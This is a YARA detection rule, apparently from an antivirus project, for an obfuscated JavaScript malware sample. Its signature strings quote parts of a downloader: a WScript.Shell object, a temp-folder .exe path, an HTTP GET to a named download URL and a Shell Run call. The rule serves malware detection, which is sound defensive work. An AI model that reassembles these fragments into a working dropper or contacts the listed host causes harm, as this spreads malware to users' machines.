rule sig_20160328_b91cc0f3e20193b25cbbb300f84af503 {
  meta:
    description = "datamaliciousorder - file 20160328_b91cc0f3e20193b25cbbb300f84af503.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "80638ca9b4a21f24d042eadc01894c16fe858a9bf409e53835af75df1fc86f52"

  strings:
    $s1  = "function Hfgwmwrf() {return Obwdqc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"i0niUIInkH.exe\";};" fullword ascii
    $s2  = "Qdoqfefvqh[Watrjaez](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Agpxhs](Otogkuqtvf() * 11)} while (Qdoqfefvqh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Obwdqc = function Ojzsiblkje() {return WScript[Zkbjq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dosnzbt(Hlgfmatlj, Zjlzqh){return Hlgfmatlj - Zjlzqh;};" fullword ascii
    $s6  = "function Wwuvphdip() {return ((Elfykbjfw == true) && (Elfykbjfw == Exjjry)) ? 1 : Uzwdrzmpfv;};" fullword ascii
    $s7  = "function Bobrtqdnja(Fqqziw){Obwdqc[\"Run\"](Fqqziw, Uzwdrzmpfv, Uzwdrzmpfv);};" fullword ascii
    $s8  = " while (Cdsvjrsj){" fullword ascii
    $s9  = "return Dosnzbt(Ynlfgjlu, Mewotv);" fullword ascii
    $s10 = "function Hsfgawu(Whufcbxmu) {var Tlacqkphbw = (1, 2, 3, 4, 5, Whufcbxmu); return Tlacqkphbw;};" fullword ascii
    $s11 = "function Otogkuqtvf(){return 22;};" fullword ascii
    $s12 = "var Exjjry = false;" fullword ascii
    $s13 = "function Vmusged()" fullword ascii
    $s14 = "var Yifofvm = new this[\"Date\"]();" fullword ascii
    $s15 = "var Tpukgcd = false;" fullword ascii
    $s16 = "function Xjuuuwn(){return Wyosv;};" fullword ascii
    $s17 = "Exjjry = true; " fullword ascii
    $s18 = "Elfykbjfw = true; " fullword ascii
    $s19 = "var Elfykbjfw = false;" fullword ascii
    $s20 = "function Zpyaiiliuv(){return Zkbjq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}